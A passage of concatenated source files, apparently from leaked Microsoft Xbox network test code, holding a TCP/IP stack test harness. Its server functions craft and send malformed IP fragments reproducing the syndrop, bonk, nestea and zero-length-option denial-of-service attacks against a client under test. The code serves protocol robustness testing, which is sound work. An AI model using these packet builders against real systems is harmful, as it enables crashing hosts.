			pSessionInfo->pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
			delete Ex;
			
		}

		// Release the packet
		if(pIPPacket)
		{
			(i == 0) ? delete (CUDPPacket *) pIPPacket : delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPAttackSynDropServ
//----------------------------------------------------------------------------------
//
// Description: Test where server sends the original syndrop attack.
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackSynDropServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CTCPPacket *pTCPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16];
	BYTE PayloadBuffer[1024];
	BOOL fUDPPacket = FALSE;

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Hard-code the address for now.  We'll work something better out later.
	MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szClientMacAddr);

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	for(INT i = 0; i < 2; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CTCPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 5);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_TCP);
			pIPPacket->IPHeader.SetDestAddr(szClientIPAddr);
			pIPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			switch(i)
			{
			case 0:
				pTCPPacket = (CTCPPacket *) pIPPacket;
				pTCPPacket->TCPHeader.SetSrcPort(pSessionInfo->LowPort);
				pTCPPacket->TCPHeader.SetDestPort(pSessionInfo->LowPort);
				pTCPPacket->TCPHeader.SetSeqNumber(1000);
				pTCPPacket->TCPHeader.SetAckNumber(0);
				pTCPPacket->TCPHeader.SetHdrLength(UDPHEADER_SIZE + SYNDROP_SIZE * 2);
				pTCPPacket->TCPHeader.SetFlag(TCP_SYN);
				pTCPPacket->TCPHeader.SetWindowSize(15000);

				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + SYNDROP_SIZE);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, UDPHEADER_SIZE, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(SYNDROP_XVALUE);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + SYNDROP_XVALUE + 1);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' , sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, SYNDROP_XVALUE + 1, TRUE);
				break;
			}

			// Send the packet
			pSessionInfo->pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
			delete Ex;
			
		}

		// Release the packet
		if(pIPPacket)
		{
			(i == 0) ? delete (CTCPPacket *) pIPPacket : delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPAttackBonkServ
//----------------------------------------------------------------------------------
//
// Description: Test where server sends the original newtear attack.
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackBonkServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16];
	BYTE PayloadBuffer[1024];
	BOOL fUDPPacket = FALSE;

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);
	
	// Hard-code the address for now.  We'll work something better out later.
	MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szClientMacAddr);
	
	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;
	
	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));
	
	for(INT i = 0; i < 2; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);
			
			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 5);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(szClientIPAddr);
			pIPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);
			
			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetDestPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(UDPHEADER_SIZE + BONK_SIZE);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + BONK_SIZE);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, BONK_SIZE, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(BONK_XVALUE + 1);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + BONK_XVALUE);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' , sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, BONK_XVALUE + 1, TRUE);
				break;
			}
			
			// Send the packet
			pSessionInfo->pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
			delete Ex;
			
		}
		
		// Release the packet
		if(pIPPacket)
		{
			(i == 0) ? delete (CUDPPacket *) pIPPacket : delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPAttackZeroLenOptServ
//----------------------------------------------------------------------------------
//
// Description: Server sends datagram with a zero-length option
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackZeroLenOptServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPOption *pIPOption = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16], PayloadData[1], *pBuffer = NULL;
	BOOL fSuccess = TRUE;

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	// Watch for SPARTA exceptions
	try
	{
		// Hard-code the address for now.  We'll work something better out later.
		MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
		CMacAddress ClientMacAddr(MediaType, szClientMacAddr);
		
		// Create the packet
		pUDPPacket = new CUDPPacket(MediaType);
		
		// Fill in the IP information from the input parameters
		pUDPPacket->MacHeader.SetDestAddress(ClientMacAddr);
		pUDPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
		pUDPPacket->MacHeader.SetProtocolType(0x800);
		pUDPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
		pUDPPacket->IPHeader.SetTOS(IPTOS_DEFAULT);
		pUDPPacket->IPHeader.SetID(IPID_DEFAULT);
		pUDPPacket->IPHeader.SetFlag(0);
		pUDPPacket->IPHeader.SetFragOffset(0);
		pUDPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
		pUDPPacket->IPHeader.SetProtocolType(IPPROTOCOL_UDP);
		pUDPPacket->IPHeader.SetDestAddr(szClientIPAddr);
		pUDPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
		
		pUDPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
		pUDPPacket->IPHeader.SetDatagramLength(IPHEADER_DEFAULT + 8 + UDPHEADER_SIZE + 1);

		pUDPPacket->IPHeader.SetAutoCalcHeaderLength(OFF);
		pUDPPacket->IPHeader.SetHdrLength(IPHEADER_DEFAULT + 8);

		pUDPPacket->IPHeader.CreateIPOption(IP_OPTIONS_NO_OPERATION);
		pIPOption = pUDPPacket->IPHeader.CreateIPOption(IP_OPTIONS_STRICT_SOURCE_RECORD_ROUTE);
		pIPOption->SetOptionBufferLength(3 + sizeof(DWORD));
		pIPOption->SetOptionLength(0);
		pIPOption->SetOptionOffset(4);
		pIPOption->SetIPAddrAt(4, szClientIPAddr);

		pUDPPacket->IPHeader.SetAutoCalcChecksum(ON);
		
		pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
		pUDPPacket->UDPHeader.SetDestPort(pSessionInfo->LowPort);
		pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
		pUDPPacket->UDPHeader.SetLength(9);
		pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
		pUDPPacket->UDPHeader.SetChecksum(0);

		PayloadData[0] = 'x';
		pUDPPacket->SetUserBuffer(PayloadData, 1, TRUE);

		pSessionInfo->pInterface->Send(*pUDPPacket);
	}
	catch(CSpartaException *Ex)
	{
		_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
		delete Ex;
		fSuccess = FALSE;
	}

	pUDPPacket ? delete pUDPPacket : 0;

	return fSuccess;
}

//==================================================================================
// IPAttackNesteaServ
//----------------------------------------------------------------------------------
//
// Description: Test where server sends the nestea attack
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackNesteaServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CUDPPacket *pUDPPacket = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16];
	BYTE PayloadBuffer[1024];
	BOOL fUDPPacket = FALSE;

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Hard-code the address for now.  We'll work something better out later.
	MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szClientMacAddr);

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	for(INT i = 0; i < 3; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pUDPPacket = new CUDPPacket(MediaType);

			// Fill in the IP header fields
			pUDPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pUDPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
			pUDPPacket->MacHeader.SetProtocolType(0x800);
			pUDPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pUDPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pUDPPacket->IPHeader.SetID(IPID_DEFAULT + 5);
			pUDPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pUDPPacket->IPHeader.SetProtocolType(PROTOCOL_TCP);
			pUDPPacket->IPHeader.SetDestAddr(szClientIPAddr);
			pUDPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
			pUDPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pUDPPacket->IPHeader.SetAutoCalcChecksum(ON);

			switch(i)
			{
			case 0:
				pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetDestPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(UDPHEADER_SIZE + 10);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);

				pUDPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pUDPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pUDPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pUDPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + 10);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pUDPPacket->SetUserBuffer(PayloadBuffer, 10, TRUE);
				break;
			case 1:
				pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetDestPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(UDPHEADER_SIZE + 108);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);

				pUDPPacket->IPHeader.SetFlag(0);
				pUDPPacket->IPHeader.SetFragOffset(6);
				
				// Manually calculate length.  We're really adding extra data.
				pUDPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pUDPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + 108);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pUDPPacket->SetUserBuffer(PayloadBuffer, 108, TRUE);
				break;
			default:
				pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetDestPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(UDPHEADER_SIZE + 256);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);

				pUDPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pUDPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pUDPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pUDPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + 296);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pUDPPacket->SetUserBuffer(PayloadBuffer, 256, TRUE);
				break;
			}

			// Send the packet
			pSessionInfo->pInterface->Send(*pUDPPacket);
		}
		catch(CSpartaException *Ex)
		{
			_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
			delete Ex;
			
		}

		// Release the packet
		pUDPPacket ? delete pUDPPacket : 0;
		pUDPPacket = NULL;
	}

	return TRUE;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\udpheader.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: UDPHeader.hpp                                                               *
* Description: This is the implementation of the UDPHeader functions                    *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       balasha       4/20/2000    created                              *
*                       deepakp       4/20/2000    added routines to return raw buffers *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_UDP_HEADER_H__
#define __SPARTA_UDP_HEADER_H__



#include "sparta.h"
#include "packets.h"
#include "udp.h"

#include "media.h"
#include "Parser.hpp"

#include "IPConstants.h"


class CUDPHeader
{
  friend class CUDPPacket;
//  friend class CICMPHeader;

protected:

   pUDP_HDR_TYPE pUDPHeader; 
   PKT_BUFFER    m_UDPBuffer;
 
   AUTO_CAL_TYPES m_AutoChecksum;
   AUTO_CAL_TYPES m_AutoLength;

public:

   CUDPHeader();
   CUDPHeader(PVOID RawBufferdw, DWORD RemainingLength,OUT PDWORD pdwProcessed);
   SPARTA_STATUS SetSrcPort(const USHORT Port);
   SPARTA_STATUS SetDestPort(const USHORT Port);
   SPARTA_STATUS SetLength(const USHORT Length);
   SPARTA_STATUS SetChecksum(const USHORT Port);
   
   SPARTA_STATUS SetAutoCalcChecksum(const AUTO_CAL_TYPES Status);
   SPARTA_STATUS SetAutoCalcLength(const AUTO_CAL_TYPES Status);
   
   AUTO_CAL_TYPES GetAutoCalcChecksum();
   AUTO_CAL_TYPES GetAutoCalcLength();

   USHORT GetSrcPort();
   USHORT GetDstPort();
   USHORT GetLength();
   USHORT GetChecksum();

   void Print();

   /**++
	Routine Description:
		Returns the UDP internal buffer
		This is required as other classes using the the header has to chain
		the buffer in the buffer chain.
	-*/
	PKT_BUFFER GetRawBuffer();

	/**++
	Routine Description:
	Copies the first bwBytes bytes of the udp header and returns the number of bytes copied
	if bwBytes is more than 8

	-*/
	SPARTA_STATUS CopyUDPHdrFrom(PVOID copyFrom, DWORD *bwBytes);


  //SPARTA_STATUS PreparePacketForSend(const USHORT IPTotalLength, const USHORT IPHeaderLength);
   
   ~CUDPHeader();

};


#endif // __SPARTA_UDP_HEADER_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\ip\client\iptest.h ===
#ifndef __IPTEST_H__
#define __IPTEST_H__

//==================================================================================
// Includes
//==================================================================================
#include <nt.h>
#include <ntrtl.h>
#include <nturtl.h>
#include <xtl.h>
#include <xnetref.h>
#include <xlog.h>
#include <xtestlib.h>
#include <netsync.h>
#include <xlog.h>
#include <xboxp.h>
#include <stdio.h>

#include "ipmsg.h"

//==================================================================================
// Defines
//==================================================================================
#define IP_SERVER_DLL_W L"ipserv.dll"
#define IP_SERVER_MAIN_FUNCTION_A "IpServerCallbackFunction"
#define IP_SERVER_START_FUNCTION_A "IpServerStartFunction"
#define IP_SERVER_STOP_FUNCTION_A "IpServerStopFunction"

#define MAX_REQUEST_RETRIES 5
#define RETRY_TIMEOUT 3000
#define SIM_REASM_MAX 4
#define TIME_INFINITY 10000

#define MAX_SIMUL_PORT_OFFSET 5
#define ABOVE_MAX_SIMUL_PORT_OFFSET 5
//==================================================================================
// Typedefs
//==================================================================================

// IP test function
typedef BOOL (*PIP_TEST_FUNCTION)(WORD LowPort, WORD HighPort);

// States that sockets can be monitored for
typedef enum _SOCKET_STATE
{
	READABLE,
	WRITEABLE,
	EXCEPTION
} SOCKET_STATE;

//==================================================================================
// Prototypes 
//==================================================================================
// Harness functions
BOOL WINAPI IpTestDllMain(IN HINSTANCE hInstance, IN DWORD dwReason, IN LPVOID lpContext);
VOID WINAPI IpTestStartTest(IN HANDLE hLog);
VOID WINAPI IpTestEndTest();

// Test case functions
BOOL IPVersionSixTest(WORD LowPort, WORD HighPort);
BOOL IPVersionBadTest(WORD LowPort, WORD HighPort);
BOOL IPHeaderLenBelowMinTest(WORD LowPort, WORD HighPort);
BOOL IPHeaderLenMaxTest(WORD LowPort, WORD HighPort);
BOOL IPHeaderLenAboveTotalLenTest(WORD LowPort, WORD HighPort);
BOOL IPHeaderLenAboveAvailTest(WORD LowPort, WORD HighPort);
BOOL IPTosNormalTest(WORD LowPort, WORD HighPort);
BOOL IPTosNetControlTest(WORD LowPort, WORD HighPort);
BOOL IPTosLowDelayTest(WORD LowPort, WORD HighPort);
BOOL IPTosHighThroughputTest(WORD LowPort, WORD HighPort);
BOOL IPTosHighReliabilityTest(WORD LowPort, WORD HighPort);
BOOL IPTosReservedTest(WORD LowPort, WORD HighPort);
BOOL IPLengthBelowMinTest(WORD LowPort, WORD HighPort);
BOOL IPLengthAtMinTest(WORD LowPort, WORD HighPort);
BOOL IPLengthAboveMinTest(WORD LowPort, WORD HighPort);
BOOL IPLengthAboveTotalTest(WORD LowPort, WORD HighPort);
BOOL IPLengthBelowTotalTest(WORD LowPort, WORD HighPort);
BOOL IPLengthMaxTest(WORD LowPort, WORD HighPort);
BOOL IPIDMinTest(WORD LowPort, WORD HighPort);
BOOL IPIDMaxTest(WORD LowPort, WORD HighPort);
BOOL IPFlagReservedSetTest(WORD LowPort, WORD HighPort);
BOOL IPFlagDontFragAndMoreFragsTest(WORD LowPort, WORD HighPort);
BOOL IPTtlMinTest(WORD LowPort, WORD HighPort);
BOOL IPTtlMaxTest(WORD LowPort, WORD HighPort);
BOOL IPProtocolUnsupportedTest(WORD LowPort, WORD HighPort);
BOOL IPProtocolICMPTooSmallTest(WORD LowPort, WORD HighPort);
BOOL IPProtocolIGMPTooSmallTest(WORD LowPort, WORD HighPort);
BOOL IPProtocolTCPTooSmallTest(WORD LowPort, WORD HighPort);
BOOL IPProtocolUDPTooSmallTest(WORD LowPort, WORD HighPort);
BOOL IPProtocolUnsupportedTooSmallTest(WORD LowPort, WORD HighPort);
BOOL IPChecksumBadTest(WORD LowPort, WORD HighPort);
BOOL IPOptionsAboveAvailTest(WORD LowPort, WORD HighPort);
BOOL IPOptionsExactSizeTest(WORD LowPort, WORD HighPort);
BOOL IPOptionsEndOfOpsLastTest(WORD LowPort, WORD HighPort);
BOOL IPOptionsEndOfOpsFirstTest(WORD LowPort, WORD HighPort);
BOOL IPFragFullReverseTest(WORD LowPort, WORD HighPort);
BOOL IPFragMidReverseTest(WORD LowPort, WORD HighPort);
BOOL IPFragLastInSecondTest(WORD LowPort, WORD HighPort);
BOOL IPFragMixedSizeTest(WORD LowPort, WORD HighPort);
BOOL IPFragOneHundredTest(WORD LowPort, WORD HighPort);
BOOL IPFragMultipleLastFragmentTest(WORD LowPort, WORD HighPort);
BOOL IPFragOverlappingFragmentsTest(WORD LowPort, WORD HighPort);
BOOL IPFragMaxDatagramSizeTest(WORD LowPort, WORD HighPort);
BOOL IPFragMaxReassemblySizeTest(WORD LowPort, WORD HighPort);
BOOL IPFragAboveMaxReassemblySizeTest(WORD LowPort, WORD HighPort);
BOOL IPFragMaxSimulReassemblyTest(WORD LowPort, WORD HighPort);
BOOL IPFragAboveMaxSimulReassemblyTest(WORD LowPort, WORD HighPort);
BOOL IPFragOversizedFragmentsTest(WORD LowPort, WORD HighPort);
BOOL IPAttackTeardropTest(WORD LowPort, WORD HighPort);
BOOL IPAttackNewTeardropTest(WORD LowPort, WORD HighPort);
BOOL IPAttackImpTeardropTest(WORD LowPort, WORD HighPort);
BOOL IPAttackSynDropTest(WORD LowPort, WORD HighPort);
BOOL IPAttackBonkTest(WORD LowPort, WORD HighPort);
BOOL IPAttackZeroLenOptTest(WORD LowPort, WORD HighPort);
BOOL IPAttackNesteaTest(WORD LowPort, WORD HighPort);
#endif // __IPTEST_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\syncserv\syncserv.cpp ===
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <tchar.h>
#include <netsync.h>

void PrintUsage()
{
	_tprintf(TEXT("Usage: syncserv <no arguments>\n"));
	return;
}

int __cdecl main(int argc, TCHAR *argv[])
{
	CHAR	tcInput = 0;

    if(argc > 1)
		PrintUsage();

	if(!NetsyncCreateServer())
	{
		_tprintf(TEXT("Couldn't create Netsync server: %u\n"), GetLastError());
		goto END;
	}
	
	_tprintf(TEXT("Netsync server started, hit \'q\' to exit\n"), GetLastError());

	tcInput = (CHAR) _getch();
	while((tcInput != 'q') && (tcInput != 'Q'))
	{
		tcInput = (TCHAR) _getch();
	}

	_tprintf(TEXT("Shutting down server.\n"), GetLastError());

	NetsyncCloseServer();

	_tprintf(TEXT("Exiting test...\n"), GetLastError());

END:
	return -1;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\samples\sendtest\sendtest.cpp ===
#include "SpartaApi.h"

int __cdecl main(int argc, TCHAR *argv[])
{

    BOOL lQuit = FALSE;
    int iCount  = 1;
	CHAR  szDestIPAddr[20], szSrcIPAddr[] = "157.55.34.163";
    UCHAR testbuf[100];       // this is a random buffer which we'll send
    memset(testbuf,0xef,104); 
    _stprintf((TCHAR*)testbuf,TEXT("This is a test buffer for send from SPARTA"));


    if(argc > 1)
    {
